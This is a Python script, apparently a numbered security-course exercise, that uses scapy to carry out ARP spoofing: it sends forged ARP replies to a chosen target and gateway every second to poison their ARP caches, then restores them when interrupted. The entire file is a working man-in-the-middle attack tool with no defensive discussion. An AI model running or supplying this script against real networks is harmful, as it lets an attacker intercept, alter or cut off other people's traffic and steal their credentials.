#!/usr/bin/env python

# Usage example: python 03_arp_spoof.py --g *.*.*.* --t *.*.*.*

import argparse
from scapy.all import Ether, ARP, srp, send
import time

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('--g', dest='gateway_ip', required=True)
    parser.add_argument('--t', dest='target_ip', required=True)
    args = parser.parse_args()
    return args

def get_mac(ip):
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request = ARP(pdst=ip)
    answered_list = srp(broadcast/arp_request, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    send(packet, verbose=False)

def restore(destination_ip, source_ip):
    packet = ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    send(packet, count=4, verbose=False)

args = get_arguments()
packets_counter = 0
try:
    while True:
        spoof(args.gateway_ip, args.target_ip)
        spoof(args.target_ip, args.gateway_ip)
        packets_counter = packets_counter + 2
        print("\rPackets sent: " + str(packets_counter), end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nDetected CTRL + C. Resetting ARP tables, please wait...", end="")
    restore(args.gateway_ip, args.target_ip)
    restore(args.target_ip, args.gateway_ip)
    print("\r\033[KDetected CTRL + C. ARP reset complete. Quitting.")